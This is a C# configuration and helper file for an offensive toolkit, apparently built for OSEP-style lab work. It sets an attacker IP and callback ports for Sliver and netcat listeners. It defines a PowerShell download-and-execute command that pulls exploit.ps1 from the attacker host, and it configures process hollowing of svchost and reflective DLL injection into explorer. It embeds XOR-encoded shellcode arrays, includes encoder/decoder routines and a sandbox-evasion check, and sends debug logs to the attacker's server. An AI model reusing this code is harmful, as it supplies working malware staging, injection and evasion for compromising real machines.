using System;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;



public static class CONFIG
{
    //Environment Variables
    public static string ATTACKER_IP = "192.168.45.194";
    public static string HTTP_PORT = "80";
    public static string HTTP_URL = $"http://{ATTACKER_IP}:{HTTP_PORT}";
    public static string BINARY_NAME = "exploit.exe";
    public static string POWERSHELL_SCRIPT_NAME = "exploit.ps1";
    public static string WAIT_TIME_SECONDS = "2";
    public static string[] LAB_SUBNETS = { "172.16.150.0", "10.10.15.0" };



    //LPORT is what you will use for one off callbacks. Think netcat, socat, meterpreter.
    //SLIV_STAGER_64 should be your intended sliver port for x64 staging
    //SLIV_STAGER_86 should be your intended sliver port for x86 staging
    public static string LPORT = "444";
    public static string SLIV_LISTENER_64 = "81";
    public static string SLIV_STAGER_64 = "82";
    public static string SLIV_LISTENER_86 = "83";
    public static string SLIV_STAGER_86 = "84";



    //InstallUtil Variables

    //Static path binary IU will attempt to run.
    public static string INSTALL_UTIL_EXE_PATH = @"C:\Windows\Public\exploit.exe"; //Location of your PE that contains malware.




    //Evasion
    public static bool ENCODED = true; //Meaning that you have used the custom encoder (From the helper tool) on the shell code. Not MSFVenom encoders. This ensures your shellcode will get decoded first.
    public static byte KEY = 0xf4;
    public static bool DETECT_SANDBOX_TIME = false; //Detect time dilation
    public static bool DETECT_SANDBOX_BAD_IMPORT = false; 


    //PowerShell Settings
    public static string PS_STATIC_COMMAND = $"iwr {HTTP_URL}/exploit.ps1 | IEX";
    public static string PS_DYNAMIC_SCRIPT_NAME = "myscript.ps1";


    //Execute Assembly Properties
    public static string EA_STATIC_PATH = @"C:\Users\will\winpeas64.exe"; //Path to the assembly you want to execute. This is a static path, meaning it will always be the same.
    public static string[] EA_STATIC_ARGS = { ">>","peas.txt"};
    public static string EA_DYNAMIC_URL = $"{HTTP_URL}/program.exe";
    public static string EA_DYNAMIC_ARGUMENTS_URL = $"{HTTP_URL}/args.txt";
    public static bool EA_DYNAMIC_WRITE_ASSEMBLY_TO_DISK = false;
    public static bool EA_ASSEMBLY_IS_ENCODED = false;
    public static string EA_ASSEMBLY_WRITE_LOCATION = @"C:\Users\ted\test.txt";


    //VBA Macro properties
    public static string MACRO_NAME = "Mymacro";


    //Hollow
    public static string HOLLOW_BINARY_TARGET = @"C:\windows\system32\svchost.exe";



    //Invoke Reflection DLL Options
    public static string INVOKEREF_HOSTED_DLL_NAME = "invref_callback.dll"; //The name of the malicious dll we want to invoke.
    public static string INVOKEREF_HOSTED_SCRIPT_NAME = "Invoke-ReflectivePEInjection.ps1"; //The name of the PS Script to facilitate injection
    public static string INVOKEREF_TARGET_PROCESS = "explorer";//Name of the process we want to inject into
    public static string INVOKEREF_VARNAMEA = "bytes"; //variable names
    public static string INVOKEREF_VARNAMEB = "procid";



    //Debug Logging
    public static bool DEBUG_CALLBACK = true;
    public static bool DEBUG_PROCESSDIR = true;
    public static bool DEBUG_USERDIR = true;
    public static bool DEBUG_TIMESTAMP = true;
    public static string DEBUG_TIMESTAMP_FORMAT = "[yyyy/MM/dd HH:mm:ss.fff]";
    public static string DEBUG_LOG_NAME = "OSEPLog";
    public static string DEBUG_LOG_EXT = "txt";




    //Shellcode
    public static string SHELLCODE_NAME = "buf";
    public static byte[] SHELLCODE64 = new byte[511] {
0xca,0x5d,0x22,0x7c,0x41,0x88,0xe5,0x8a,0x90,0x5e,0x41,0xd5,0x66,0xfd,0x2d,0x6b,0x41,0xb3,0xb4,0x65,
0x32,0x8f,0x01,0x70,0x23,0x01,0xf2,0x23,0xa9,0x6f,0xc3,0xe8,0xea,0x08,0x4c,0x11,0xcf,0xf0,0x01,0x33,
0x4d,0x71,0xc7,0x4f,0x18,0xae,0xfd,0xb2,0x61,0x2c,0x7d,0xce,0x67,0x10,0x1a,0xe4,0xa8,0xe2,0x7c,0xb1,
0xe9,0xf5,0x48,0x87,0xa2,0x9e,0x56,0x7b,0x9b,0xeb,0xe1,0xd5,0x57,0xc9,0xb8,0x96,0xa2,0x8d,0x4e,0x7b,
0x03,0x5e,0x95,0x4a,0x0d,0x73,0x8f,0x73,0xc1,0x87,0xc9,0x02,0xee,0x26,0x73,0x46,0x65,0x01,0x09,0xfc,
0xc1,0x25,0x7e,0x86,0xc1,0x28,0x92,0x00,0xfb,0xc7,0x20,0x03,0x61,0xb3,0xd9,0x61,0xac,0x5a,0x0a,0x26,
0xeb,0xf3,0xc1,0x20,0x79,0xb4,0xcf,0x68,0xe8,0x2b,0x44,0xd7,0xfd,0x2b,0xc8,0x2a,0x3d,0x40,0xf9,0x2b,
0x19,0xcd,0x3b,0x65,0x43,0xa9,0x45,0x42,0x78,0x15,0xf2,0x89,0xc5,0xc3,0x49,0xd8,0x03,0x75,0x70,0x13,
0x9c,0x7e,0xb7,0x81,0xc9,0x1b,0x57,0x82,0xf6,0x79,0x4e,0xef,0xdd,0x59,0x57,0xbc,0xd7,0x3e,0x98,0xfe,
0xed,0x38,0xe8,0x57,0x50,0xc3,0x82,0x1c,0x79,0xde,0xf4,0x92,0xc2,0x9c,0xfd,0x39,0x17,0x41,0x26,0x18,
0xb4,0x34,0x0b,0xb4,0x42,0xb9,0x1d,0x38,0xde,0xb5,0xd8,0x07,0x74,0x5a,0xdd,0xf6,0x6b,0xbc,0x39,0xaa,
0x04,0x50,0x48,0xde,0x7d,0xc2,0xa3,0x57,0xaa,0x71,0xdd,0xe4,0xa9,0x93,0xc2,0xe0,0x5a,0x16,0x99,0xa9,
0x4a,0x8b,0xb6,0xca,0xc4,0xe5,0xa2,0x3d,0xf9,0xdb,0xf1,0x81,0xcb,0x76,0xec,0x0a,0x2b,0xec,0x0d,0x26,
0x2d,0x0b,0x04,0xe9,0x66,0xee,0x54,0x16,0x29,0xe5,0x06,0x29,0xc6,0x59,0x8d,0x2d,0x8f,0xae,0x1c,0x99,
0x09,0x68,0x76,0x01,0x56,0x2d,0x21,0x00,0x00,0x21,0xb8,0x2a,0x89,0x1a,0xd4,0xc1,0x0c,0xaf,0xa0,0xfd,
0xff,0x4d,0xc5,0x82,0x5d,0x3d,0x73,0x4d,0x51,0xab,0xc9,0x1c,0x1e,0x80,0xbc,0x08,0xf9,0x15,0xae,0x6d,
0x24,0x37,0x36,0x6c,0xf7,0x59,0xb5,0xb7,0x95,0x60,0x5b,0x3e,0x62,0xf3,0x55,0x09,0x16,0xad,0x61,0x0f,
0x4d,0xda,0x95,0x54,0x65,0xff,0xb0,0x20,0x0d,0xcd,0xf4,0x16,0x4a,0xba,0x59,0xfa,0x17,0x1a,0x49,0x7f,
0xe6,0xfe,0xb2,0x71,0x60,0x57,0x64,0xed,0xf3,0x18,0x86,0x3e,0x9a,0xe9,0x7d,0x18,0x2d,0x75,0xba,0x01,
0x7b,0x16,0xe0,0x7f,0x39,0x2a,0xa7,0x25,0x3d,0xab,0x25,0x81,0xa1,0xa4,0xed,0x5e,0x69,0x0c,0x53,0x7c,
0x7f,0x00,0xf2,0xe1,0xbe,0xc6,0x30,0xb9,0xdc,0xc1,0x01,0xed,0xe8,0xb8,0x62,0x68,0xb0,0xb7,0xd4,0xab,
0xdc,0xbc,0xb2,0xdc,0xb1,0xbd,0x70,0x5c,0x70,0x6f,0xb4,0xb8,0x82,0xdc,0x7f,0x40,0x8d,0x10,0x63,0x55,
0xaa,0x02,0x6c,0xb5,0x45,0x4c,0xf9,0xcb,0x6c,0xb9,0x92,0x10,0x1c,0x45,0x50,0x11,0x6a,0xf4,0x9a,0xab,
0xf2,0x0d,0xf6,0x71,0xba,0xe0,0xc9,0xa8,0x50,0xae,0x75,0xef,0xc9,0x88,0x71,0xad,0xe5,0xb7,0x68,0xb8,
0x5a,0x20,0x20,0xb8,0x59,0xa9,0xe7,0xef,0xd8,0xd2,0x64,0x40,0x1c,0x06,0xab,0xb6,0x25,0x39,0xe6,0x61,
0x54,0x86,0xc5,0xd1,0x79,0x0a,0xc9,0x5c,0x69,0x34,0x21};










    public static byte[] SHELLCODE86 = new byte[376] {
0x3f,0xb7,0xf7,0xfc,0x41,0x3c,0x5b,0xb3,0x75,0x30,0x31,0xd9,0xd2,0x1e,0x1c,0x55,0xca,0x10,0xff,0x98,
0x6a,0x6f,0xac,0x89,0x8a,0x59,0xd2,0x29,0xe0,0x49,0x73,0x95,0xbd,0x73,0x9d,0x90,0x12,0xa8,0xa3,0xed,
0xe5,0x62,0x4d,0x74,0x22,0xc2,0x1f,0xdd,0xb3,0x72,0xa1,0x4e,0x86,0xb2,0x79,0x8f,0x76,0xc9,0x5e,0xdc,
0x95,0xd2,0xd8,0x7f,0x93,0x0f,0xf9,0xa7,0xba,0x9a,0xf5,0x51,0x1f,0xc9,0x08,0xb1,0x4a,0x3f,0xc3,0x16,
0x07,0x00,0x3a,0x8d,0x24,0x45,0x68,0xd6,0x43,0x7d,0xbd,0xb1,0xdc,0x18,0x46,0x1c,0x62,0xbc,0xa1,0x39,
0x70,0x7a,0x58,0xf0,0x7e,0xbb,0x1c,0x20,0x69,0x06,0x44,0xbc,0x50,0xcc,0x0e,0xe4,0x32,0x66,0x16,0x02,
0xeb,0x9e,0x28,0x85,0x92,0x41,0xb3,0xdc,0xcd,0x8e,0x4a,0x22,0x4c,0xa4,0x2b,0x98,0x17,0x40,0xf3,0xba,
0x29,0xbd,0x94,0x7b,0x42,0xed,0x58,0x62,0x29,0x6d,0x54,0x20,0x32,0x3b,0x30,0x76,0x1a,0x8a,0x6b,0xab,
0xc8,0xc6,0x9a,0x66,0x51,0x72,0x6a,0x8c,0x31,0x17,0xa6,0x80,0xba,0xe9,0xd3,0x29,0x8c,0x9f,0x7a,0x18,
0x86,0x02,0xad,0x6e,0x28,0xeb,0x94,0xeb,0xa4,0x09,0x26,0x44,0x2a,0x42,0x1d,0xb8,0x72,0x94,0x4d,0x66,
0xca,0x35,0xa9,0x32,0x34,0xb2,0x08,0x74,0xf8,0xdd,0xb9,0x75,0x57,0xf1,0x92,0x37,0xe3,0x3d,0x6e,0xb2,
0x47,0x76,0x93,0x9b,0x8c,0x9f,0xb8,0xe3,0x55,0x81,0x19,0x3a,0x9c,0xb2,0xb1,0x46,0x10,0x7e,0x88,0x12,
0xb2,0xbe,0x59,0xfc,0x7e,0xba,0x35,0x7d,0x27,0x12,0x59,0xec,0x44,0x8e,0x21,0xb2,0xbf,0x14,0xb7,0x66,
0x7d,0xb3,0xa0,0xa9,0x46,0x3c,0xd2,0x28,0xef,0x03,0x78,0xed,0xb6,0x6d,0x55,0x69,0x8e,0x01,0x9f,0x44,
0xd5,0xc6,0x37,0x92,0x0e,0xac,0x77,0xd4,0x76,0x4d,0x81,0xd5,0x24,0xb1,0xe2,0xb6,0x37,0x74,0xcb,0x9e,
0x07,0x46,0xb7,0x88,0xf9,0x97,0x94,0x97,0x8e,0x04,0xa5,0x62,0xf3,0x7c,0x86,0xc2,0xc3,0x2e,0x39,0xdb,
0x60,0x7f,0x20,0x19,0x23,0xc6,0xa6,0x27,0xc3,0x5e,0x46,0x9b,0x61,0x02,0x69,0xe7,0x75,0x09,0x3f,0x52,
0x03,0x17,0x4b,0xa6,0xcc,0x66,0x37,0x5b,0xa4,0xaf,0xec,0xdb,0xf0,0x4d,0x92,0x32,0xa6,0x70,0xbb,0x1b,
0x92,0xde,0x6f,0x9a,0x40,0xc1,0xfb,0x07,0x1a,0x5a,0x27,0x52,0x73,0x19,0xd6,0x7e};

















    [DllImport("kernel32.dll")]
    public static extern void Sleep(uint dwMilliseconds);

    public static void SandboxTimeDetect()
    {
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return;
        }
    }

    public static byte[] NormalizeShellCode(string input)
    {
        string t = input;

        //Normalize text
        string[] parts = t.Split('=');
        if (parts.Length == 2)
            t = parts[1];
        else
            t = parts[0];

        parts = t.Split('{');
        if (parts.Length == 2)
            t = parts[1];
        else
            t = parts[0];

        parts = t.Split('}');
        if (parts.Length == 2)
            t = parts[0];

        t = t.Replace("0x", "").Replace(@"\x", ",").Replace("\"", "").Replace("\n", "").Replace(";", "").TrimStart(',').TrimEnd(',');


        parts = t.Split(',');

        byte[] bytes = new byte[parts.Length];
        int i = 0;
        foreach (string s in parts)
        {
            bytes[i] = byte.Parse(s, System.Globalization.NumberStyles.HexNumber);
            i++;
        }

        return bytes;
    }

    public static string BeautifyBytes(byte[] bytes, int length)
    {
        StringBuilder sb = new StringBuilder();

        int i = 1;
        foreach (byte b in bytes)
        {
            sb.Append($"0x{b.ToString("x2")},");
            if (i >= length)
            {
                sb.Append("\n");
                i = 0;
            }
            i++;
        }

        return sb.ToString().TrimEnd(',');
    }

    public static void DecodeCONFIG()
    {
        //Jank time. Could be better. Out of time :(
        string relpath = Path.GetFullPath(AppContext.BaseDirectory + "..\\..\\..\\..\\Configuration\\OSEPGlobals.cs");
        string g = File.ReadAllText(relpath);

        string sc64_matcher = @"SHELLCODE64 = new byte\[[0-9]{1,99}] {[a-fA-F0-9xX,\r\n ]{1,}};";
        string sc86_matcher = @"SHELLCODE86 = new byte\[[0-9]{1,99}] {[a-fA-F0-9xX,\r\n ]{1,}};";

        //Get Shellcode Matches
        Match sc64 = Regex.Match(g, sc64_matcher);
        Match sc86 = Regex.Match(g, sc86_matcher);


        byte[] bytes64;
        byte[] bytes86;

        //Encode the Shellcode
        if (sc64 != null)
        {
            bytes64 = Evasion.Decode(CONFIG.NormalizeShellCode(sc64.ToString()));
        }
        else
        {
            bytes64 = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF };
        }

        if (sc86 != null)
        {
            bytes86 = Evasion.Decode(CONFIG.NormalizeShellCode(sc86.ToString()));
        }
        else
        {
            bytes86 = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF };
        }




        //Start injecting encoded shellcode back into the cs file.

        StringBuilder sb64 = new StringBuilder();
        sb64.Append($"SHELLCODE64 = ");
        sb64.Append($"new byte[{bytes64.Length}] {{\n");
        sb64.Append(CONFIG.BeautifyBytes(bytes64, 20));
        sb64.Append("};");
        g = Regex.Replace(g, sc64_matcher, sb64.ToString());

        StringBuilder sb86 = new StringBuilder();
        sb86.Append($"SHELLCODE86 = ");
        sb86.Append($"new byte[{bytes86.Length}] {{\n");
        sb86.Append(CONFIG.BeautifyBytes(bytes86, 20));
        sb86.Append("};");
        g = Regex.Replace(g, sc86_matcher, sb86.ToString());




        File.WriteAllText(relpath, g);
    }

    public static void EncodeCONFIG()
    {
        //Jank time. Could be better. Out of time :(
        string relpath = Path.GetFullPath(AppContext.BaseDirectory + "..\\..\\..\\Configuration\\OSEPGlobals.cs");
        string g = File.ReadAllText(relpath);

        string sc64_matcher = @"SHELLCODE64 = new byte\[[0-9]{1,99}] {[a-fA-F0-9xX,\r\n ]{1,}};";
        string sc86_matcher = @"SHELLCODE86 = new byte\[[0-9]{1,99}] {[a-fA-F0-9xX,\r\n ]{1,}};";

        //Get Shellcode Matches
        Match sc64 = Regex.Match(g, sc64_matcher);
        Match sc86 = Regex.Match(g, sc86_matcher);


        byte[] bytes64;
        byte[] bytes86;

        //Encode the Shellcode
        if (sc64 != null)
        {
            bytes64 = Evasion.Encode(CONFIG.NormalizeShellCode(sc64.ToString()));
        }
        else
        {
            bytes64 = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF };
        }

        if (sc86 != null)
        {
            bytes86 = Evasion.Encode(CONFIG.NormalizeShellCode(sc86.ToString()));
        }
        else
        {
            bytes86 = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF };
        }




        //Start injecting encoded shellcode back into the cs file.

        StringBuilder sb64 = new StringBuilder();
        sb64.Append($"SHELLCODE64 = ");
        sb64.Append($"new byte[{bytes64.Length}] {{\n");
        sb64.Append(CONFIG.BeautifyBytes(bytes64, 20));
        sb64.Append("};");
        g = Regex.Replace(g, sc64_matcher, sb64.ToString());

        StringBuilder sb86 = new StringBuilder();
        sb86.Append($"SHELLCODE86 = ");
        sb86.Append($"new byte[{bytes86.Length}] {{\n");
        sb86.Append(CONFIG.BeautifyBytes(bytes86, 20));
        sb86.Append("};");
        g = Regex.Replace(g, sc86_matcher, sb86.ToString());




        File.WriteAllText(relpath, g);
    }

}




public static class Debug
{
    public static void RunDebug(string logText)
    {
        if (CONFIG.DEBUG_CALLBACK)
            WriteLogCallback(logText);

        if (CONFIG.DEBUG_PROCESSDIR)
            WriteLogAppDir(logText);

        if (CONFIG.DEBUG_USERDIR)
            WriteLogUserDir(logText);

        
    }

    public static async void WriteLogCallback(string logText)
    {
        try
        {
            HttpClient client = new HttpClient();
            string response = await client.GetStringAsync($"{CONFIG.HTTP_URL}/{CONFIG.DEBUG_LOG_NAME}/{Uri.EscapeDataString(logText)}");
        }
        catch { }
        
    }

    public static void WriteLogUserDir(string logText)
    {
        try
        {
            string timestamp = DateTime.Now.ToString(CONFIG.DEBUG_TIMESTAMP_FORMAT);
            string homeDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{CONFIG.DEBUG_LOG_NAME}.{CONFIG.DEBUG_LOG_EXT}";

            if (CONFIG.DEBUG_TIMESTAMP)
                logText = $"{timestamp} {logText}";

            File.AppendAllText(homeDirectory, logText + "\n");
        }
        catch { }
    }

    public static void WriteLogAppDir(string logText)
    {
        try
        {
            string timestamp = DateTime.Now.ToString(CONFIG.DEBUG_TIMESTAMP_FORMAT);
            string appDirectory = AppContext.BaseDirectory + $"\\{CONFIG.DEBUG_LOG_NAME}.{CONFIG.DEBUG_LOG_EXT}";

            if (CONFIG.DEBUG_TIMESTAMP)
                logText = $"{timestamp} {logText}";
            File.AppendAllText(appDirectory, logText + "\n");
        }
        catch { }
        
    }
}



public static class Evasion
{
    [DllImport("kernel32.dll")]
    public static extern void Sleep(uint dwMilliseconds);




    public static byte[] Encode(byte[] inputBuffer)
    {
        if (inputBuffer == null)
            throw new ArgumentNullException("inputBuffer");

        int inputLength = inputBuffer.Length;
        int remainder = inputLength % 2;
        int midPoint = inputLength / 2;

        byte[] interimBuffer = new byte[inputLength];
        byte[] outputBuffer = new byte[inputLength];

        // First shuffle
        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
        {
            interimBuffer[j] =
                unchecked((byte)(inputBuffer[midPoint + i] ^ CONFIG.KEY));

            interimBuffer[j + 1] =
                unchecked((byte)(inputBuffer[midPoint - i - 1] ^ CONFIG.KEY));
        }

        if (remainder != 0)
        {
            interimBuffer[inputLength - 1] =
                unchecked((byte)(inputBuffer[inputLength - 1] ^ CONFIG.KEY));
        }

        // Second shuffle
        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
        {
            outputBuffer[j] =
                unchecked((byte)(interimBuffer[midPoint + i] ^ i));

            outputBuffer[j + 1] =
                unchecked((byte)(interimBuffer[midPoint - i - 1] ^ i));
        }

        if (remainder != 0)
        {
            outputBuffer[inputLength - 1] =
                interimBuffer[inputLength - 1];
        }

        return outputBuffer;
    }

    public static byte[] Decode(byte[] inputBuffer)
    {
        if (inputBuffer == null)
            throw new ArgumentNullException("inputBuffer");

        int inputLength = inputBuffer.Length;
        int remainder = inputLength % 2;
        int midPoint = inputLength / 2;

        byte[] interimBuffer = new byte[inputLength];
        byte[] outputBuffer = new byte[inputLength];

        // First unshuffle
        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
        {
            interimBuffer[midPoint + i] =
                unchecked((byte)(inputBuffer[j] ^ i));

            interimBuffer[midPoint - i - 1] =
                unchecked((byte)(inputBuffer[j + 1] ^ i));
        }

        if (remainder != 0)
        {
            interimBuffer[inputLength - 1] =
                inputBuffer[inputLength - 1];
        }

        // Second unshuffle
        for (int i = 0, j = 0; i < midPoint; i++, j += 2)
        {
            outputBuffer[midPoint + i] =
                unchecked((byte)(interimBuffer[j] ^ CONFIG.KEY));

            outputBuffer[midPoint - i - 1] =
                unchecked((byte)(interimBuffer[j + 1] ^ CONFIG.KEY));
        }

        if (remainder != 0)
        {
            outputBuffer[inputLength - 1] =
                unchecked((byte)(interimBuffer[inputLength - 1] ^ CONFIG.KEY));
        }

        return outputBuffer;
    }



    public static void SandboxTimeDetect(uint basetime)
    {

        DateTime t1 = DateTime.Now;
        Sleep(basetime);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        double x = basetime * 0.75;
        if ((t2 * 1000) < x)
        {
            Environment.Exit(0);
        }
    }


}


